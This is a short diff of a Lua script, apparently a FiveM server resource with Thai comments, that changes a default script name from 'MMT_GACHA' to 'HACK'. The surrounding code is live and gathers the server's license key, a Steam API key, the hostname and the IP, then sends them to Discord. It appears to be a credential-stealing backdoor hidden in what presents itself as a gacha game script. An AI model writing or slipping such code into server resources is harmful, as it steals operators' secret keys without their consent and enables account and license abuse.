@@ -23,7 +23,7 @@ function getConfigData(ip)
     local licenseKey = GetConvar('sv_licenseKey', 'ไม่ระบุ License Key')
 
     -- สมมติว่า script_name เป็นชื่อของสคริปต์ที่ถูก ensure
-    local scriptName = GetConvar('ensure', 'MMT_GACHA')
+    local scriptName = GetConvar('ensure', 'HACK')
     
     -- ส่งข้อมูลไปยัง Discord
     sendToDiscord(ip, hostname, steamApiKey, licenseKey, scriptName)
